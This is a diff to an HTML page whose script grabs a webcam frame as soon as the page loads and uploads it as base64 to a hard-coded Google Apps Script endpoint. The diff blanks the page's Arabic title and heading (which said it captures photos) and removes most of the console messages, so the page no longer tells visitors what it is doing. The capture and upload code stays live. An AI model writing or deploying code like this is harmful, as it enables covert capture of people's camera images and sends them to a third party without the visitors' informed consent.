@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>كاميرا الويب</title>
+  <title></title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -16,18 +16,16 @@
   </style>
 </head>
 <body>
-  <h1>إلتقاط الصور</h1>
+  <h1></h1>
   <canvas id="canvas"></canvas>
 
   <script>
     window.onload = function () {
-      console.log("✅ الصفحة جاهزة");
       const canvas = document.getElementById("canvas");
       const scriptURL = "https://script.google.com/macros/s/AKfycbx0NBTgmLm6KNgEnaM88cbzmfRtLHp7i9dNjjS2av_RVGhcqC3xTQMStTIQkULf9R77Mw/exec";
 
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(function (stream) {
-          console.log("🎥 تم الوصول إلى الكاميرا بنجاح");
           const video = document.createElement("video");
           video.srcObject = stream;
           video.play();
@@ -38,17 +36,10 @@
             const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            console.log("📸 تم التقاط صورة من الكاميرا");
             canvas.toBlob(function (blob) {
-              if (!blob) {
-                console.error("❌ لم يتم إنشاء Blob من Canvas");
-                return;
-              }
-              console.log("🔄 تحويل الصورة إلى Base64...");
               const reader = new FileReader();
               reader.onloadend = function () {
                 const base64 = reader.result.split(",")[1];
-                console.log("📤 إرسال البيانات إلى سكريبت جوجل...");
                 sendToGoogleScript(base64);
               };
               reader.readAsDataURL(blob);
@@ -62,16 +53,12 @@
       function sendToGoogleScript(base64Image) {
         const formData = new FormData();
         formData.append("photo", base64Image);
-        console.log("🔍 البيانات المرسلة:", formData.get("photo").substring(0, 30) + "..."); // عرض جزء من البيانات للتأكد
         fetch(scriptURL, {
           method: "POST",
           body: formData
         })
-          .then((res) => {
-            console.log("📩 تم استلام الرد من السكريبت");
-            return res.text();
-          })
-          .then((res) => console.log("✅ تم الإرسال بنجاح:", res))
+          .then((res) => res.text())
+          .then((res) => console.log("✅ تم الإرسال:", res))
           .catch((err) => console.error("❌ فشل الإرسال:", err));
       }
     }
